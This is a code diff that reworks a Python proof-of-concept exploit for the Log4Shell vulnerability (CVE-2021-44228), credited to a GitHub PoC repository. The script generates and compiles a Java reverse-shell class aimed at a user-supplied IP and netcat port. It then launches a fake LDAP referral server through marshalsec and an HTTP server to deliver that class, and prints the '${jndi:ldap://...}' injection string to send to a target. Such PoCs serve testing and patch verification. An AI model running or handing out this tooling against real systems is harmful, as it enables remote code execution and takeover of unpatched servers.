@@ -1,18 +1,29 @@
 import subprocess
-import os
 import sys
+import argparse
+from colorama import Fore, init
+import subprocess
+import threading
 
-javaver = subprocess.call(['./jdk1.8.0_20/bin/java', '-version']) #stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-print("\n")
+from http.server import HTTPServer, SimpleHTTPRequestHandler
 
-userip = input("[+] Enter IP for LDAPRefServer & Shell: ")
-userport = input("[+] Enter listener port for LDAPRefServer: ")
-lport = input("[+] Set listener port for shell: ")
+init(autoreset=True)
 
-def payload():
+def listToString(s):
+    str1 = ""
+    try:
+      for ele in s:
+        str1 += ele
+      return str1
+    except Exception as ex:
+      parser.print_help()
+      sys.exit()
+    
 
-    javapayload = ("""
+def payload(userip , webport , lport):
 
+  genExploit = (
+      """
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -49,21 +60,79 @@ public class Exploit {
     s.close();
   }
 }
+  """) % (userip, lport)
 
-""") % (userip,lport)
+  # writing the exploit to Exploit.java file 
 
+  try:
     f = open("Exploit.java", "w")
-    f.write(javapayload)
+    f.write(genExploit)
     f.close()
+    print(Fore.GREEN + '[+] Exploit java class created success')
 
-    os.system('./jdk1.8.0_20/bin/javac Exploit.java')
+  except Exception as e:
+    print(Fore.RED + f'[-] Something went wrong {e.toString()}')
 
-    sendme = ("${jndi:ldap://%s:1389/a}") % (userip)
-    print("[+] Send me: "+sendme+"\n")
+  checkJavaAvailible()
+  print(Fore.GREEN + '[+] Setting up fake LDAP server\n')
 
-def marshalsec():
-    os.system("./jdk1.8.0_20/bin/java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://{}:{}/#Exploit".format(userip, userport))
+  # create the LDAP server on new thread
+  t1 = threading.Thread(target=createLdapServer, args=(userip,webport))
+  t1.start()
 
-if __name__== "__main__":
-    payload()
-    marshalsec()
+  # start the web server
+
+
+  httpd = HTTPServer(('localhost', int(webport)), SimpleHTTPRequestHandler)
+  httpd.serve_forever()
+
+
+
+def checkJavaAvailible():
+  javaver = subprocess.call(['./jdk1.8.0_20/bin/java', '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+  if(javaver != 0):
+    print(Fore.RED + '[-] Java is not installed inside the repository ')
+    sys.exit()
+  
+
+def createLdapServer(userip, lport):
+  sendme = ("${jndi:ldap://%s:1389/a}") % (userip)
+  print(Fore.GREEN +"[+] Send me: "+sendme+"\n")
+
+  subprocess.run(["./jdk1.8.0_20/bin/javac", "Exploit.java"])
+
+  url = "http://{}:{}/#Exploit".format(userip, lport)
+  subprocess.run(["./jdk1.8.0_20/bin/java", "-cp",
+                 "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", url])
+ 
+
+def header():
+  print(Fore.BLUE+"""
+[!] CVE: CVE-2021-44228
+[!] Github repo: https://github.com/kozmer/log4j-shell-poc
+""")
+
+if __name__ == "__main__":
+  header()
+
+  try:
+    parser = argparse.ArgumentParser(description='please enter the values ')
+
+    parser.add_argument('--userip', metavar='userip', type=str,
+                        nargs='+', help='Enter IP for LDAPRefServer & Shell')
+
+    parser.add_argument('--webport', metavar='webport', type=str,
+                        nargs='+', help='listener port for HTTP port')
+
+    parser.add_argument('--lport', metavar='lport', type=str,
+                        nargs='+', help='Netcat Port')
+
+    args = parser.parse_args()
+
+    #print(args.userip)
+
+    payload(listToString(args.userip), listToString(args.webport), listToString(args.lport))
+
+  except KeyboardInterrupt:
+    print(Fore.RED + "user interupted the program.")
+    sys.exit(0)
